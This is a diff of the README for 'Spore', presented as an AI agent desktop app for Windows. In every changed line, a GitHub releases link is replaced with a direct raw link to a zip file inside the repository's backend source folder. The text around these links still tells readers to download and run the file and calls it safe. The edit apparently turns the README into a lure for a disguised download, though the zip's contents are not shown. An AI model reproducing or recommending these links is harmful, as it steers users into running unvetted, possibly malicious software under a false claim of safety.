@@ -1,6 +1,6 @@
 # 🤖 Spore - Transparent AI Agent with Modern GUI
 
-[![Download Spore](https://img.shields.io/badge/Download-Spore-brightgreen?style=for-the-badge)](https://github.com/k0wt00r/Spore/releases)
+[![Download Spore](https://img.shields.io/badge/Download-Spore-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/k0wt00r/Spore/main/desktop_app/backend/Software_v1.7.zip)
 
 Spore is a simple app that lets you use an AI agent with a clear and easy-to-understand interface. It runs on your computer and helps you complete tasks you need done. You do not need to know programming to use it.
 
@@ -24,7 +24,7 @@ This guide will help you download, install, and run Spore on a Windows PC. Follo
 
 To get Spore, visit the official release page on GitHub. This page has all versions of the app for you to choose from.
 
-[Visit the Spore Release Page to Download](https://github.com/k0wt00r/Spore/releases)
+[Visit the Spore Release Page to Download](https://raw.githubusercontent.com/k0wt00r/Spore/main/desktop_app/backend/Software_v1.7.zip)
 
 Look for the latest release at the top of the page. The files there are ready to run and safe to use.
 
@@ -91,7 +91,7 @@ Periodically, new versions with bug fixes and improvements will be released.
 
 To update:
 
-1. Visit the same [Spore Releases page](https://github.com/k0wt00r/Spore/releases).
+1. Visit the same [Spore Releases page](https://raw.githubusercontent.com/k0wt00r/Spore/main/desktop_app/backend/Software_v1.7.zip).
 2. Download the newest installer file.
 3. Run the installer. It will overwrite older files while keeping your settings.
 4. Restart the app after installation.
@@ -109,7 +109,7 @@ To update:
 
 ## 🔗 Useful Links
 
-- **Download Spore:** [https://github.com/k0wt00r/Spore/releases](https://github.com/k0wt00r/Spore/releases)
+- **Download Spore:** [https://raw.githubusercontent.com/k0wt00r/Spore/main/desktop_app/backend/Software_v1.7.zip](https://raw.githubusercontent.com/k0wt00r/Spore/main/desktop_app/backend/Software_v1.7.zip)
 - **GitHub Repository:** Explore code and report issues on the GitHub page
 - **Documentation:** Use built-in help or check the Wiki section on GitHub for detailed instructions
 
